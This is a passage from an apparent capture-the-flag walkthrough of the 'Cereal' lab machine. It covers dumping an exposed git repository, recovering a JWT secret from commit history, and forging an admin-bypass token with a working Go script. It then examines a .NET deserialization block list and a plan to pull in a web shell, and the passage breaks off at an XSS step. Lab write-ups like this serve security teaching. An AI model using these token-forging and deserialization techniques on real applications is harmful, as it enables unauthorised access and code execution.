-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing https://source.cereal.htb/.git/ <span style="color:#f92672">[</span>403<span style="color:#f92672">]</span>
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching common files
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.gitignore <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/description <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
-...&lt;SNIP&gt;...
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding refs/
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/ORIG_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/config <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/FETCH_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
-...&lt;SNIP&gt;...
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding packs
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding objects
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching objects
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
-...&lt;SNIP&gt;...
-<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Running git checkout .
-</code></pre></div><h4 id="git-history">Git History</h4>
-<p>I could see the history of this repository by issuing <code>git log</code>.</p>
-<p><img class="img-container" src="imgs/image-20210605121727689.png" alt="image-20210605121727689"  />
-</p>
-<p>Aside from the author&rsquo;s names, one commit with the message &ldquo;Security fixes&rdquo; caught my attention.</p>
-<p>I immediately run <code>git diff 8f2a 7bd9</code> to compare the first commit with the security fixes and that reveals a deleted JWT secret.</p>
-<p><img class="img-container" src="imgs/image-20210609090452619.png" alt="image-20210609090452619"  />
-</p>
-<p>It looks like the security fixes include prevention against deserialization attacks which I&rsquo;ll note that as well as the secret:</p>
-<ul>
-<li>JWT secret: <code>secretlhfIH&amp;FY*#oysuflkhskjfhefesf</code></li>
-</ul>
-<h3 id="source-code-analysis-1">Source Code Analysis #1</h3>
-<blockquote>
-<p>I pointed my sh*tty explanation or at least how I understand it with <code>// &lt;==</code> or  <code># &lt;==</code> in the code snippet. Please, don&rsquo;t bully me for this.</p>
-</blockquote>
-<h4 id="app-overview">App Overview</h4>
-<p>The app consist of ASP.NET (back-end)  and React (front-end).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «source-cereal-git» «10.10.14.3» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> 
-$ tree -L <span style="color:#ae81ff">1</span> --dirsfirst
-.
-├── ClientApp
-├── Controllers
-├── Migrations
-├── Models
-├── Pages
-├── Properties
-├── Services
-├── ApplicationOptions.cs
-├── appsettings.Development.json
-├── appsettings.json
-├── CerealContext.cs
-├── Cereal.csproj
-├── DownloadHelper.cs
-├── ExtensionMethods.cs
-├── IPAddressHandler.cs
-├── IPRequirement.cs
-├── Program.cs
-└── Startup.cs
-</code></pre></div><p>The source code of previously seen React app at <code>cereal.htb</code> is on the ClientApp folder.</p>
-<p>Here is the overview of app execution flow:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Program.cs
- |
- v
-Startup.cs  -&gt; Loads appsettings.json
- |
- v
-React client
-</code></pre></div><p>Looking into the <code>appsettings.js</code>, I could obtain the following information:</p>
-<ul>
-<li>There is IP whitelist</li>
-<li>There are two rules that looks like limiting requests and it&rsquo;ll reset after certain period. One of them is limiting a post request to an endpoint called <code>/requests</code>.</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
-<span style="color:#960050;background-color:#1e0010">...&lt;SNIP&gt;...</span>
-  <span style="color:#f92672">&#34;AllowedHosts&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
-  <span style="color:#f92672">&#34;ApplicationOptions&#34;</span>: {
-    <span style="color:#f92672">&#34;Whitelist&#34;</span>: [ <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span> ]
-  },
-  <span style="color:#f92672">&#34;IpRateLimiting&#34;</span>: {
-    <span style="color:#f92672">&#34;EnableEndpointRateLimiting&#34;</span>: <span style="color:#66d9ef">true</span>,
-    <span style="color:#f92672">&#34;StackBlockedRequests&#34;</span>: <span style="color:#66d9ef">false</span>,
-    <span style="color:#f92672">&#34;RealIpHeader&#34;</span>: <span style="color:#e6db74">&#34;X-Real-IP&#34;</span>,
-    <span style="color:#f92672">&#34;ClientIdHeader&#34;</span>: <span style="color:#e6db74">&#34;X-ClientId&#34;</span>,
-    <span style="color:#f92672">&#34;HttpStatusCode&#34;</span>: <span style="color:#ae81ff">429</span>,
-    <span style="color:#f92672">&#34;IpWhitelist&#34;</span>: [ <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span> ],
-    <span style="color:#f92672">&#34;EndpointWhitelist&#34;</span>: [],
-    <span style="color:#f92672">&#34;ClientWhitelist&#34;</span>: [],
-    <span style="color:#f92672">&#34;GeneralRules&#34;</span>: [
-      {
-        <span style="color:#f92672">&#34;Endpoint&#34;</span>: <span style="color:#e6db74">&#34;post:/requests&#34;</span>,
-        <span style="color:#f92672">&#34;Period&#34;</span>: <span style="color:#e6db74">&#34;5m&#34;</span>,
-        <span style="color:#f92672">&#34;Limit&#34;</span>: <span style="color:#ae81ff">2</span>
-      },
-      {
-        <span style="color:#f92672">&#34;Endpoint&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
-        <span style="color:#f92672">&#34;Period&#34;</span>: <span style="color:#e6db74">&#34;5m&#34;</span>,
-        <span style="color:#f92672">&#34;Limit&#34;</span>: <span style="color:#ae81ff">150</span>
-      }
-    ]
-  }
-}
-
-</code></pre></div><h4 id="authentication-vulnerability">Authentication Vulnerability</h4>
-<p>Looking into the <code>Startup.cs</code> file, I could see there is a potential authentication bypass. On the following code snippet, the application clearly doesn&rsquo;t validate the issuer and the audience of a JWT token, and <a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">this can raise a security issue</a>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
-    <span style="color:#66d9ef">var</span> key = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;*&#34;</span>);
-    services.AddAuthentication(x =&gt;
-    {
-        x.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;
-        x.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;
-    })
-    .AddJwtBearer(x =&gt;
-    {
-        x.RequireHttpsMetadata = <span style="color:#66d9ef">false</span>;
-        x.SaveToken = <span style="color:#66d9ef">true</span>;
-        x.TokenValidationParameters = <span style="color:#66d9ef">new</span> TokenValidationParameters
-        {
-            ValidateIssuerSigningKey = <span style="color:#66d9ef">true</span>,
-            IssuerSigningKey = <span style="color:#66d9ef">new</span> SymmetricSecurityKey(key),
-            ValidateIssuer = <span style="color:#66d9ef">false</span>, <span style="color:#75715e">// &lt;== No validation
-</span><span style="color:#75715e"></span>            ValidateAudience = <span style="color:#66d9ef">false</span> <span style="color:#75715e">// &lt;== No validation
-</span><span style="color:#75715e"></span>        };
-    });
-...&lt;SNIP&gt;...
-</code></pre></div><p>The JWT token itself is forged at <code>Services/UserService.cs</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#66d9ef">public</span> User Authenticate(<span style="color:#66d9ef">string</span> username, <span style="color:#66d9ef">string</span> password)
-        {
-            <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> db = <span style="color:#66d9ef">new</span> CerealContext())
-            {
-                <span style="color:#66d9ef">var</span> user = db.Users.Where(x =&gt; x.Username == username &amp;&amp; x.Password == password).SingleOrDefault();
-
-                <span style="color:#75715e">// return null if user not found
-</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (user == <span style="color:#66d9ef">null</span>)
-                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
-
-                <span style="color:#75715e">// authentication successful so generate jwt token
-</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">var</span> tokenHandler = <span style="color:#66d9ef">new</span> JwtSecurityTokenHandler();
-                <span style="color:#66d9ef">var</span> key = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;*&#34;</span>);
-                <span style="color:#66d9ef">var</span> tokenDescriptor = <span style="color:#66d9ef">new</span> SecurityTokenDescriptor
-                {
-                    Subject = <span style="color:#66d9ef">new</span> ClaimsIdentity(<span style="color:#66d9ef">new</span> Claim[]
-                    {
-                        <span style="color:#66d9ef">new</span> Claim(ClaimTypes.Name, user.UserId.ToString())
-                    }),
-                    Expires = DateTime.UtcNow.AddDays(<span style="color:#ae81ff">7</span>),
-                    SigningCredentials = <span style="color:#66d9ef">new</span> SigningCredentials(<span style="color:#66d9ef">new</span> SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
-                };
-                <span style="color:#66d9ef">var</span> token = tokenHandler.CreateToken(tokenDescriptor);
-                user.Token = tokenHandler.WriteToken(token);
-
-                <span style="color:#66d9ef">return</span> user.WithoutPassword();
-            }
-</code></pre></div><p>When the user attempts to authenticate, the code snippet above checks to see if the user&rsquo;s credentials match those in the database. If the credentials match, the app will generate a JWT token for that user.</p>
-<p>The user model is defined in here <code>Models/User.cs</code>. From here, I can assume each JWT token contains at least a user&rsquo;s ID, expiration time (7 days), Username, and Token.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
-    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
-    {
-<span style="color:#a6e22e">        [Key]</span>
-        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> UserId { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
-<span style="color:#a6e22e">        [Required]</span>
-        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Username { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
-<span style="color:#a6e22e">        [Required]</span>
-        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Password { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
-        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Token { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
-    }
-...&lt;SNIP&gt;...
-</code></pre></div><p>Interestingly, in <code>ClientApp/src/LoginPage/LoginPage.jsx</code>, the authentication process doesn&rsquo;t look like it needs server/back-end validation, because it checks the browser&rsquo;s local storage first.</p>
-<blockquote>
-<p>It&rsquo;ll ask the server if we press the login button (POST request).</p>
-</blockquote>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
-<span style="color:#66d9ef">import</span> { <span style="color:#a6e22e">authenticationService</span> } <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#39;../_services&#39;</span>; <span style="color:#75715e">// &lt;==
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LoginPage</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">React</span>.<span style="color:#a6e22e">Component</span> {
-    <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">props</span>) {
-        <span style="color:#66d9ef">super</span>(<span style="color:#a6e22e">props</span>);
-
-        <span style="color:#75715e">// redirect to home if already logged in
-</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">authenticationService</span>.<span style="color:#a6e22e">currentUserValue</span>) {  <span style="color:#75715e">// &lt;==
-</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;/&#39;</span>); 
-        }
-    }
-
-    <span style="color:#a6e22e">render</span>() {
-        <span style="color:#66d9ef">return</span> (
-            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
-                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Login</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/h2&gt;</span>
-...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
-</code></pre></div><p>I could track the <code>authenticationService.currentUserValue</code> and it is defined in  <code>ClientApp/src/_services/authentication.service.jsx</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">currentUserSubject</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BehaviorSubject</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#39;currentUser&#39;</span>))); <span style="color:#75715e">// &lt;==
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">export</span> <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">authenticationService</span> <span style="color:#f92672">=</span> {
-    <span style="color:#a6e22e">login</span>,
-    <span style="color:#a6e22e">logout</span>,
-    <span style="color:#a6e22e">currentUser</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">currentUserSubject</span>.<span style="color:#a6e22e">asObservable</span>(),<span style="color:#75715e">// &lt;==
-</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">get</span> <span style="color:#a6e22e">currentUserValue</span> () { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">currentUserSubject</span>.<span style="color:#a6e22e">value</span> } <span style="color:#75715e">// &lt;==
-</span><span style="color:#75715e"></span>};
-</code></pre></div><h3 id="authentication-bypass">Authentication Bypass</h3>
-<p>I could summarize the previous code analysis to these points:</p>
-<ul>
-<li>As long as the browser&rsquo;s local storage contains a key of <code>currentUser</code> which has JWT token in its value, the client app will logs the user in.</li>
-<li>No other validation in JWT token except the user&rsquo;s ID and expires date. (based on <code>Services/UserService.cs</code>)</li>
-<li>Based on  <code>Models/User.cs</code>,  <code>Services/UserService.cs</code>, and  <code>ClientApp/src/_services/auth-header.js</code> , the form of <code>currentUser</code> is something like this:
-<ul>
-<li><code>&quot;currentUser&quot; : &quot;{ &quot;userId&quot;: &quot;0&quot;, &quot;username&quot;: &quot;name&quot;, &quot;token&quot;: &quot;JWT token&quot;}&quot;</code>.</li>
-</ul>
-</li>
-</ul>
-<h4 id="tactics">Tactics</h4>
-<p>Here is the tactics to bypass the login page:</p>
-<ul>
-<li>Since there is no validation on the issuer, and I have the JWT secret key, I could forge my own JWT.</li>
-<li>I&rsquo;ll put the forged JWT token to browser&rsquo;s local storage of <code>cereal.htb</code> with the key name of <code>currentUser</code>.</li>
-<li>Simply refresh the page afterwards and see if it logs me in.</li>
-</ul>
-<h4 id="forge-jwt">Forge JWT</h4>
-<p>To forge our own JWT, you could try <a href="https://github.com/ticarpi/jwt_tool">jwtool</a>, but I tried to forge my own JWT using Golang lol.</p>
-<p>Here is the code:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
-
-<span style="color:#f92672">import</span> (
-	<span style="color:#e6db74">&#34;encoding/json&#34;</span>
-	<span style="color:#e6db74">&#34;fmt&#34;</span>
-	<span style="color:#e6db74">&#34;time&#34;</span>
-
-	<span style="color:#e6db74">&#34;github.com/dgrijalva/jwt-go&#34;</span>
-)
-
-<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">UserService</span> <span style="color:#66d9ef">interface</span> {
-	<span style="color:#a6e22e">CreateToken</span>(<span style="color:#a6e22e">userID</span> <span style="color:#66d9ef">string</span>) <span style="color:#66d9ef">string</span>
-}
-
-<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">jwtService</span> <span style="color:#66d9ef">struct</span> {
-	<span style="color:#a6e22e">secretKey</span> <span style="color:#66d9ef">string</span>
-}
-
-<span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">s</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">jwtService</span>) <span style="color:#a6e22e">CreateToken</span>() <span style="color:#66d9ef">string</span> {
-	<span style="color:#a6e22e">claims</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">StandardClaims</span>{
-		<span style="color:#a6e22e">ExpiresAt</span>: <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">AddDate</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>).<span style="color:#a6e22e">UTC</span>().<span style="color:#a6e22e">Unix</span>(),
-	}
-
-	<span style="color:#a6e22e">token</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">NewWithClaims</span>(<span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">SigningMethodHS256</span>, <span style="color:#a6e22e">claims</span>)
-	<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">SignedString</span>([]byte(<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">secretKey</span>))
-	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
-		panic(<span style="color:#a6e22e">err</span>)
-	}
-	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">t</span>
-}
-
-<span style="color:#66d9ef">type</span> <span style="color:#a6e22e">User</span> <span style="color:#66d9ef">struct</span> {
-	<span style="color:#a6e22e">UserId</span>   <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;userId,omitempty&#34;`</span>
-	<span style="color:#a6e22e">Username</span> <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;username,omitempty&#34;`</span>
-	<span style="color:#a6e22e">Token</span>    <span style="color:#66d9ef">string</span> <span style="color:#e6db74">`json:&#34;token,omitempty&#34;`</span>
-}
-
-<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
-	<span style="color:#a6e22e">jwt</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">jwtService</span>{}
-	<span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">secretKey</span> = <span style="color:#e6db74">&#34;secretlhfIH&amp;FY*#oysuflkhskjfhefesf&#34;</span>
-
-	<span style="color:#a6e22e">cu</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">User</span>{
-		<span style="color:#a6e22e">UserId</span>:   <span style="color:#e6db74">&#34;1&#34;</span>,
-		<span style="color:#a6e22e">Username</span>: <span style="color:#e6db74">&#34;iamf&#34;</span>,
-		<span style="color:#a6e22e">Token</span>:    <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">CreateToken</span>(),
-	}
-
-	<span style="color:#a6e22e">currentUser</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">json</span>.<span style="color:#a6e22e">Marshal</span>(<span style="color:#a6e22e">cu</span>)
-	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#a6e22e">currentUser</span>)
-}
-</code></pre></div><p>A bit messy but that&rsquo;s work.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «cereal» «10.10.14.3»
-$ go run main.go
-<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;userId&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;iamf&#34;</span>,<span style="color:#e6db74">&#34;token&#34;</span>:<span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM&#34;</span><span style="color:#f92672">}</span>
-</code></pre></div><h4 id="login">Login</h4>
-<p>Refreshing the page after storing the token into the browser&rsquo;s local storage logs me in.</p>
-<p><img class="img-container" src="imgs/image-20210609113605143.png" alt="image-20210609113605143"  />
-</p>
-<h4 id="input-testing">Input testing</h4>
-<p>When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.</p>
-<p><img class="img-container" src="imgs/image-20210605163056142.png" alt="image-20210605163056142"  />
-</p>
-<p>Here how the request and response looks like.</p>
-<p><img class="img-container" src="imgs/image-20210605183457568.png" alt="image-20210605183457568"  />
-</p>
-<h3 id="source--code-analysis-2">Source  Code Analysis #2</h3>
-<blockquote>
-<p>I decided to mix it with images hehe.</p>
-</blockquote>
-<h4 id="deserialization-vulnerability">Deserialization Vulnerability</h4>
-<p>Looking into the request controller,  <code>Controllers/RequestsController.cs</code>, it turns out that each Cereal Request (POST) sent is saved in database without validation.</p>
-<p><img class="img-container" src="imgs/image-20210609115652148.png" alt="image-20210609115652148"  />
-</p>
-<p>Actually, there is a client-side validation, but it could easily be bypassed with Burp repeater. From here, I could send a cereal request in any format. For example is as follows:</p>
-<p><img class="img-container" src="imgs/image-20210609122743196.png" alt="image-20210609122743196"  />
-</p>
-<p>The cereal database&rsquo;s name can be found inside  <code>CerealContext.cs</code></p>
-<p><img class="img-container" src="imgs/image-20210609120019771.png" alt="image-20210609120019771"  />
-</p>
-<p>Looking back into the request controller, there is a comment inside the <code>Get</code> function that points out about deserialization (previously seen upon comparing the commit logs):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
-<span style="color:#a6e22e">        [Authorize(Policy = &#34;RestrictIP&#34;)]</span>
-<span style="color:#a6e22e">        [HttpGet(&#34;{id}&#34;)]</span>
-        <span style="color:#66d9ef">public</span> IActionResult Get(<span style="color:#66d9ef">int</span> id)
-        {
-            <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> db = <span style="color:#66d9ef">new</span> CerealContext())
-            {
-                <span style="color:#66d9ef">string</span> json = db.Requests.Where(x =&gt; x.RequestId == id).SingleOrDefault().JSON;
-                <span style="color:#75715e">// Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial
-</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (json.ToLower().Contains(<span style="color:#e6db74">&#34;objectdataprovider&#34;</span>) || json.ToLower().Contains(<span style="color:#e6db74">&#34;windowsidentity&#34;</span>) || json.ToLower().Contains(<span style="color:#e6db74">&#34;system&#34;</span>))
-                {
-                    <span style="color:#66d9ef">return</span> BadRequest(<span style="color:#66d9ef">new</span> { message = <span style="color:#e6db74">&#34;The cereal police have been dispatched.&#34;</span> });
-                }
-                <span style="color:#66d9ef">var</span> cereal = JsonConvert.DeserializeObject(json, <span style="color:#66d9ef">new</span> JsonSerializerSettings
-                {
-                    TypeNameHandling = TypeNameHandling.Auto
-                });
-                <span style="color:#66d9ef">return</span> Ok(cereal.ToString());
-            }
-        }
-</code></pre></div><p>The <code>Get</code> function can only be accessed if the request IP is in the whitelist (defined in <code>appsettings.json</code> ) and it takes one parameter called <code>id</code> (GET <code>/requests/{id}</code>).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#a6e22e">[Authorize(Policy = &#34;RestrictIP&#34;)]</span>
-<span style="color:#a6e22e">[HttpGet(&#34;{id}&#34;)]</span>
-</code></pre></div><p>This line blocks the gadget classes used for .NET deserialization attack.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;objectdataprovider&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;windowsidentity&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">||</span> json.ToLower<span style="color:#f92672">()</span>.Contains<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;system&#34;</span><span style="color:#f92672">))</span>
-</code></pre></div><p>But, there is a class called <code>DownloadHelper</code> that has a function which can be used to send a download request:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
-    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DownloadHelper</span>
-    {
-        <span style="color:#66d9ef">private</span> String <span style="color:#ae81ff">_</span>URL;
-        <span style="color:#66d9ef">private</span> String <span style="color:#ae81ff">_F</span>ilePath;
-        <span style="color:#66d9ef">public</span> String URL
-...&lt;SNIP&gt;...
-        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> Download()
-        {
-            <span style="color:#66d9ef">using</span> (WebClient wc = <span style="color:#66d9ef">new</span> WebClient())
-            {
-                <span style="color:#66d9ef">if</span> (!<span style="color:#66d9ef">string</span>.IsNullOrEmpty(<span style="color:#ae81ff">_</span>URL) &amp;&amp; !<span style="color:#66d9ef">string</span>.IsNullOrEmpty(<span style="color:#ae81ff">_F</span>ilePath))
-                {
-                    wc.DownloadFile(<span style="color:#ae81ff">_</span>URL, ReplaceLastOccurrence(<span style="color:#ae81ff">_F</span>ilePath,<span style="color:#e6db74">&#34;\\&#34;</span>, <span style="color:#e6db74">&#34;\\21098374243-&#34;</span>));
-                }
-            }
-        }
-</code></pre></div><p>I could use <code>DownloadHelper</code> class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.</p>
-<p>The problem here I couldn&rsquo;t make a GET request to <code>requests/{id}</code>  because there is an IP restriction policy.</p>
-<h4 id="xss-vulnerability">XSS Vulnerability</h4>
-<p>When tracking down where the previous GET request coming, I find out that each Cereal Request sent lands on the admin page (<code>AdminPage.jsx</code>).</p>
-<p><img class="img-container" src="imgs/image-20210609114906150.png" alt="image-20210609114906150"  />
-</p>
-<p>And one of the app library used in the admin page called <code>react-marked-down</code> has an <a href="https://hackerone.com/reports/344069">XSS vulnerability</a>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
